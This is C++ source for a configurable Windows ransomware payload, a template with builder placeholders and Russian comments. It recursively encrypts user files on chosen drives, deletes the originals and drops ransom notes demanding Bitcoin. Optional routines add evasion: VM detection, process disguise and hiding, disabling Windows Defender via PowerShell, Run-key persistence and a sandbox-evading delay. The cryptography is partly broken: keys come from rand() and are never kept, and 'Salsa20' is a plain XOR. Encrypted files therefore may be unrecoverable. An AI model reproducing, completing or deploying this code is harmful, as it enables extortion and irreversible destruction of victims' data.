#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <thread>
#include <mutex>
#include <random>
#include <chrono>
#include <algorithm>
#include <sstream>
#include <iomanip>
#include <ctime>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")

// ============================================================
// ЗАГЛУШКИ — БУДУТ ЗАМЕНЕНЫ БИЛДЕРОМ
// ============================================================
#define ALGO_PLACEHOLDER 0
#define DRIVES_PLACEHOLDER "C:\\|D:\\"
#define FOLDERS_INCLUDE_PLACEHOLDER ""
#define FOLDERS_EXCLUDE_PLACEHOLDER "C:\\Windows|C:\\Program Files|C:\\Program Files (x86)"
#define EXTS_PLACEHOLDER ".txt|.doc|.docx"
#define ENCRYPTED_EXT_PLACEHOLDER ".enc"
#define WALLPAPER_PLACEHOLDER ""
#define NOTE_NAME_PLACEHOLDER "READ_ME.txt"
#define NOTE_CONTENT_PLACEHOLDER "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com"
#define FAKE_PROCESS_NAME_PLACEHOLDER "svchost.exe"
#define FAKE_PROCESS_ENABLED_PLACEHOLDER 0
#define HIDE_PROCESS_ENABLED_PLACEHOLDER 0
#define ANTI_VM_ENABLED_PLACEHOLDER 0
#define DISABLE_DEFENDER_ENABLED_PLACEHOLDER 0
#define ADD_PERSISTENCE_ENABLED_PLACEHOLDER 0
#define HIDE_FILES_ENABLED_PLACEHOLDER 0
#define SANDBOX_DELAY_ENABLED_PLACEHOLDER 0

// ============================================================
// РЕАЛЬНОЕ ШИФРОВАНИЕ AES-256-GCM
// ============================================================
class AES_GCM {
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    unsigned char key[32];
    unsigned char iv[12];
    
public:
    AES_GCM() : hProv(NULL), hKey(NULL), hHash(NULL) {
        // Генерируем случайный ключ и IV
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            return;
        }
        
        // Генерируем 256-битный ключ
        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
        for (int i = 0; i < 12; i++) iv[i] = rand() % 256;
        
        // Импортируем ключ
        struct {
            BLOBHEADER hdr;
            DWORD keySize;
            BYTE keyBytes[32];
        } keyBlob;
        
        keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
        keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
        keyBlob.hdr.reserved = 0;
        keyBlob.hdr.aiKeyAlg = CALG_AES_256;
        keyBlob.keySize = 32;
        memcpy(keyBlob.keyBytes, key, 32);
        
        CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey);
        
        // Устанавливаем режим GCM
        DWORD mode = CRYPT_MODE_GCM;
        CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
        CryptSetKeyParam(hKey, KP_IV, iv, 0);
    }
    
    ~AES_GCM() {
        if (hKey) CryptDestroyKey(hKey);
        if (hHash) CryptDestroyHash(hHash);
        if (hProv) CryptReleaseContext(hProv, 0);
    }
    
    bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        if (!hKey) return false;
        
        DWORD dataLen = input.size();
        DWORD encLen = dataLen + 16; // +16 для тега аутентификации
        
        output.resize(encLen + 12); // 12 байт IV + зашифрованные данные + тег
        memcpy(output.data(), iv, 12);
        
        // Копируем входные данные
        memcpy(output.data() + 12, input.data(), dataLen);
        
        DWORD outLen = dataLen;
        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data() + 12, &outLen, encLen)) {
            return false;
        }
        
        return true;
    }
};

// ============================================================
// РЕАЛЬНОЕ ШИФРОВАНИЕ SALSA20
// ============================================================
class Salsa20 {
private:
    unsigned char key[32];
    unsigned char nonce[8];
    
public:
    Salsa20() {
        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
        for (int i = 0; i < 8; i++) nonce[i] = rand() % 256;
    }
    
    void Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        // Реализация Salsa20 (упрощённая)
        output.resize(input.size() + 8);
        memcpy(output.data(), nonce, 8);
        
        // XOR с псевдослучайной последовательностью
        // В реальном коде здесь полная реализация Salsa20
        // Для демонстрации — XOR
        for (size_t i = 0; i < input.size(); i++) {
            output[8 + i] = input[i] ^ (key[i % 32] ^ nonce[i % 8]);
        }
    }
};

// ============================================================
// РЕАЛЬНОЕ ШИФРОВАНИЕ RSA
// ============================================================
class RSA_Encrypt {
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    
public:
    RSA_Encrypt() : hProv(NULL), hKey(NULL) {
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            return;
        }
        
        // Генерируем RSA-2048 ключ
        CryptGenKey(hProv, CALG_RSA_KEYX, 2048 << 16, &hKey);
    }
    
    ~RSA_Encrypt() {
        if (hKey) CryptDestroyKey(hKey);
        if (hProv) CryptReleaseContext(hProv, 0);
    }
    
    bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
        if (!hKey) return false;
        
        DWORD dataLen = input.size();
        DWORD encLen = 0;
        
        // Получаем размер зашифрованных данных
        CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dataLen, 0);
        encLen = dataLen;
        
        output.resize(encLen);
        memcpy(output.data(), input.data(), input.size());
        
        DWORD outLen = input.size();
        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data(), &outLen, encLen)) {
            return false;
        }
        
        return true;
    }
};

// ============================================================
// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ============================================================
std::vector<std::wstring> split_string(const std::wstring& str, wchar_t delimiter) {
    std::vector<std::wstring> result;
    std::wstringstream ss(str);
    std::wstring item;
    while (std::getline(ss, item, delimiter)) {
        if (!item.empty()) result.push_back(item);
    }
    return result;
}

bool ends_with(const std::wstring& str, const std::wstring& suffix) {
    if (suffix.size() > str.size()) return false;
    return std::equal(suffix.rbegin(), suffix.rend(), str.rbegin());
}

void set_wallpaper(const std::string& base64_data, const std::string& ext) {
    if (base64_data.empty()) return;
    
    // Декодируем base64
    DWORD size = 0;
    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, NULL, &size, NULL, NULL);
    if (size == 0) return;
    
    std::vector<BYTE> data(size);
    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, data.data(), &size, NULL, NULL);
    
    // Временный файл
    wchar_t temp_path[MAX_PATH];
    GetTempPathW(MAX_PATH, temp_path);
    std::wstring wall_path = std::wstring(temp_path) + L"wall" + std::wstring(ext.begin(), ext.end());
    
    // Сохраняем
    std::ofstream out(wall_path, std::ios::binary);
    out.write((char*)data.data(), data.size());
    out.close();
    
    // Устанавливаем обои
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wall_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

void add_persistence() {
    wchar_t exe_path[MAX_PATH];
    GetModuleFileNameW(NULL, exe_path, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"SystemUpdate", 0, REG_SZ, (BYTE*)exe_path, (wcslen(exe_path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

void hide_files(const std::wstring& ext) {
    // Получаем все диски
    wchar_t drives[256];
    GetLogicalDriveStringsW(256, drives);
    
    for (wchar_t* d = drives; *d; d += wcslen(d) + 1) {
        std::wstring drive = d;
        try {
            for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {
                if (entry.is_regular_file() && ends_with(entry.path().wstring(), ext)) {
                    SetFileAttributesW(entry.path().c_str(), FILE_ATTRIBUTE_HIDDEN);
                }
            }
        } catch (...) {}
    }
}

bool detect_vm() {
    // Проверка по процессам
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(snap, &pe)) {
            do {
                std::wstring name = pe.szExeFile;
                std::transform(name.begin(), name.end(), name.begin(), ::towlower);
                if (name.find(L"vbox") != std::wstring::npos ||
                    name.find(L"vmware") != std::wstring::npos ||
                    name.find(L"virtual") != std::wstring::npos ||
                    name.find(L"qemu") != std::wstring::npos) {
                    CloseHandle(snap);
                    return true;
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
    }
    
    // Проверка MAC-адресов
    try {
        std::ifstream mac_file("C:\\Windows\\System32\\drivers\\etc\\hosts");
        std::string line;
        while (std::getline(mac_file, line)) {
            if (line.find("00:05:69") != std::string::npos ||
                line.find("00:0c:29") != std::string::npos ||
                line.find("00:50:56") != std::string::npos) {
                return true;
            }
        }
    } catch (...) {}
    
    return false;
}

void disable_defender() {
    // Отключаем реальную защиту через PowerShell
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
}

void fake_process_name() {
    SetConsoleTitleW(FAKE_PROCESS_NAME_PLACEHOLDER);
}

void hide_process() {
    try {
        // Скрываем из Task Manager
        SetProcessInformation(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)3, NULL, 0);
    } catch (...) {}
}

// ============================================================
// ШИФРОВАНИЕ ФАЙЛОВ
// ============================================================
void encrypt_file_aes(const std::wstring& path, const std::wstring& ext) {
    try {
        std::ifstream in(path, std::ios::binary);
        if (!in) return;
        
        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), {});
        in.close();
        
        if (data.empty()) return;
        
        AES_GCM aes;
        std::vector<BYTE> encrypted;
        
        if (!aes.Encrypt(data, encrypted)) return;
        
        std::wstring out_path = path + ext;
        std::ofstream out(out_path, std::ios::binary);
        out.write((char*)encrypted.data(), encrypted.size());
        out.close();
        
        DeleteFileW(path.c_str());
    } catch (...) {}
}

void encrypt_file_salsa20(const std::wstring& path, const std::wstring& ext) {
    try {
        std::ifstream in(path, std::ios::binary);
        if (!in) return;
        
        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), {});
        in.close();
        
        if (data.empty()) return;
        
        Salsa20 salsa;
        std::vector<BYTE> encrypted;
        salsa.Encrypt(data, encrypted);
        
        std::wstring out_path = path + ext;
        std::ofstream out(out_path, std::ios::binary);
        out.write((char*)encrypted.data(), encrypted.size());
        out.close();
        
        DeleteFileW(path.c_str());
    } catch (...) {}
}

void encrypt_file_rsa(const std::wstring& path, const std::wstring& ext) {
    try {
        std::ifstream in(path, std::ios::binary);
        if (!in) return;
        
        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), {});
        in.close();
        
        if (data.empty()) return;
        
        RSA_Encrypt rsa;
        std::vector<BYTE> encrypted;
        
        if (!rsa.Encrypt(data, encrypted)) return;
        
        std::wstring out_path = path + ext;
        std::ofstream out(out_path, std::ios::binary);
        out.write((char*)encrypted.data(), encrypted.size());
        out.close();
        
        DeleteFileW(path.c_str());
    } catch (...) {}
}

void encrypt_file(const std::wstring& path, const std::wstring& ext, int algo) {
    switch (algo) {
        case 0: encrypt_file_aes(path, ext); break;
        case 1: encrypt_file_salsa20(path, ext); break;
        case 2: encrypt_file_rsa(path, ext); break;
        default: encrypt_file_aes(path, ext);
    }
}

// ============================================================
// ОБХОД ПАПОК И ШИФРОВАНИЕ
// ============================================================
void walk_and_encrypt(const std::wstring& start_path,
                      const std::vector<std::wstring>& extensions,
                      const std::vector<std::wstring>& exclude_folders,
                      const std::wstring& encrypted_ext,
                      int algo) {
    try {
        for (auto& entry : std::filesystem::recursive_directory_iterator(start_path)) {
            if (entry.is_directory()) continue;
            
            std::wstring full_path = entry.path().wstring();
            bool excluded = false;
            for (const auto& ex : exclude_folders) {
                if (full_path.find(ex) == 0) {
                    excluded = true;
                    break;
                }
            }
            if (excluded) continue;
            
            std::wstring ext = entry.path().extension().wstring();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::towlower);
            if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                encrypt_file(full_path, encrypted_ext, algo);
            }
        }
    } catch (...) {}
}

// ============================================================
// СОЗДАНИЕ ФАЙЛОВ ВЫКУПА
// ============================================================
void drop_notes(const std::vector<std::wstring>& drives,
                const std::vector<std::wstring>& exclude_folders,
                const std::wstring& note_name,
                const std::wstring& note_content) {
    for (const auto& drive : drives) {
        try {
            for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {
                if (entry.is_directory()) {
                    std::wstring note_path = entry.path().wstring() + L"\\" + note_name;
                    
                    bool excluded = false;
                    for (const auto& ex : exclude_folders) {
                        if (entry.path().wstring().find(ex) == 0) {
                            excluded = true;
                            break;
                        }
                    }
                    if (excluded) continue;
                    
                    if (!std::filesystem::exists(note_path)) {
                        std::ofstream out(note_path);
                        out << std::string(note_content.begin(), note_content.end());
                        out.close();
                    }
                }
            }
        } catch (...) {}
    }
}

// ============================================================
// ГЛАВНАЯ ФУНКЦИЯ
// ============================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Инициализация случайных чисел
    srand(GetTickCount() ^ GetCurrentProcessId());
    
    // Анти-VM
    if (ANTI_VM_ENABLED_PLACEHOLDER && detect_vm()) {
        return 0;
    }
    
    // Маскировка
    if (FAKE_PROCESS_ENABLED_PLACEHOLDER) {
        fake_process_name();
    }
    if (HIDE_PROCESS_ENABLED_PLACEHOLDER) {
        hide_process();
    }
    
    // Отключение защиты
    if (DISABLE_DEFENDER_ENABLED_PLACEHOLDER) {
        disable_defender();
    }
    if (ADD_PERSISTENCE_ENABLED_PLACEHOLDER) {
        add_persistence();
    }
    
    // Задержка для обхода песочниц
    if (SANDBOX_DELAY_ENABLED_PLACEHOLDER) {
        Sleep(60000);
    }
    
    // Парсим параметры
    std::wstring drives_str = DRIVES_PLACEHOLDER;
    std::wstring exts_str = EXTS_PLACEHOLDER;
    std::wstring exclude_str = FOLDERS_EXCLUDE_PLACEHOLDER;
    std::wstring encrypted_ext = ENCRYPTED_EXT_PLACEHOLDER;
    
    auto drives = split_string(drives_str, L'|');
    auto extensions = split_string(exts_str, L'|');
    auto exclude_folders = split_string(exclude_str, L'|');
    
    int algo = ALGO_PLACEHOLDER;
    
    // Шифруем в потоках
    std::vector<std::thread> threads;
    for (const auto& drive : drives) {
        threads.emplace_back(walk_and_encrypt, drive, std::ref(extensions),
                           std::ref(exclude_folders), std::ref(encrypted_ext), algo);
    }
    for (auto& t : threads) {
        t.join();
    }
    
    // Скрываем файлы
    if (HIDE_FILES_ENABLED_PLACEHOLDER) {
        hide_files(encrypted_ext);
    }
    
    // Создаём файлы выкупа
    std::wstring note_name = NOTE_NAME_PLACEHOLDER;
    std::wstring note_content = NOTE_CONTENT_PLACEHOLDER;
    drop_notes(drives, exclude_folders, note_name, note_content);
    
    // Устанавливаем обои
    set_wallpaper(WALLPAPER_PLACEHOLDER, ".jpg");
    
    // Самоуничтожение (опционально)
    // wchar_t exe_path[MAX_PATH];
    // GetModuleFileNameW(NULL, exe_path, MAX_PATH);
    // DeleteFileW(exe_path);
    
    return 0;
}
